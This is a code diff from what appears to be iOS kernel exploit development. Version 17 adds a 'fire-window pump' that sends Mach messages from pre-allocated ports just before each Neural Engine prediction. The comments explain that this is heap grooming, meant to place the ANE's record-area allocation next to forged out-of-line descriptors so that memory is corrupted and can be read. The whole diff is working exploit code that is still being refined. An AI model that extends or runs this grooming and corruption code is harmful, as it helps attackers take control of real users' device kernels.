@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v16-reload"
+#define P099_BUILD @"p099-aneprewire-v17-firepump"
 
 #define P099_INPUT_COUNT 254
 /* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
@@ -322,6 +322,14 @@ static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
    {sid, flags 0xcx, tail 0x0000000100000001} on a desc reads
    type=0x0001 (OOL-forged) = the conversion door — probe the 64-bit
    address field fault-safely (mach_vm_read_overwrite via dlsym). */
+/* v17: fire-window pump — send `batch` door kmsgs on pre-made ports. */
+static void p099_fire_pump(uint32_t batch) {
+    for (uint32_t k = 0; k < batch && g_p099_pumpSent < P099_PUMP_PORTS; k++) {
+        mach_port_t p = g_p099_pumpPorts[g_p099_pumpSent];
+        if (!p) break;
+        if (p099_send_portkind_victim(p, 0xF000u + g_p099_pumpSent)) g_p099_pumpSent++;
+    }
+}
 static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
     typedef kern_return_t (*p099_vmread_t)(mach_port_t, uint64_t, uint64_t,
                                            uint64_t, uint64_t *);
@@ -335,6 +343,15 @@ static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
 }
 
 static int g_p099_oolHits;
+/* v17 FIRE-WINDOW PUMP: groom-time kmsgs sit too far from the ANE's
+   record-area allocation (dozens of framework allocs intervene; MAF #11/#12
+   both rec0xc0 3072 with the reclaim running proved the kept-8 free slots
+   sit adjacent to the ANE's pop set). The pump sends door kmsgs from
+   PRE-MADE ports immediately before each prediction attempt so the ANE's
+   record-area element pops in the same magazine region. */
+#define P099_PUMP_PORTS 64u
+static mach_port_t g_p099_pumpPorts[P099_PUMP_PORTS];
+static uint32_t    g_p099_pumpSent;
 /* v11 door-run totals: per-door-round read/clean/smash census — the verdict
    speaks in door terms. (The v7/v8 snapshot-DIFFERS law is REMOVED: it
    flagged our own msgh_id low bytes + legit translated names as "desc words
@@ -556,6 +573,9 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 if (g_p099_portkindN == P099_PAIR_COUNT)
                     L(@"[v15] reclaim-pump: %u freed slots re-claimed with door kmsgs (kept=%u free = the ANE's pop set)",
                       reclaimed, kept);
+                /* v17: pre-make the fire-window pump ports (send at fire time) */
+                for (uint32_t k = 0; k < P099_PUMP_PORTS; k++)
+                    g_p099_pumpPorts[k] = p099_make_port();
             }
         }
         sync();
@@ -643,6 +663,8 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                                 L(@"[fire %d] model reloaded (fresh ANE compile session)", t);
                             }
                             err = nil;
+                            p099_fire_pump(4);   /* v17 fire-window pump (adjacent-pop law) */
+                            if (!t) L(@"[v17] fire-window pump armed (ports=%u, batch=4/attempt)", g_p099_pumpSent);
                             id<MLFeatureProvider> pred =
                                 [model predictionFromFeatures:provider error:&err];
                             if (pred) {
@@ -846,6 +868,10 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                         }
                     }
                 }
+            }
+            /* v17: drain the fire-window pump ports through the door law */
+            for (uint32_t k = 0; k < g_p099_pumpSent; k++) {
+                if (g_p099_pumpPorts[k]) p099_recv_portkind_door(g_p099_pumpPorts[k], 0xF000u + k);
             }
             L(@"=== VERDICT ===");
             if (hits) {
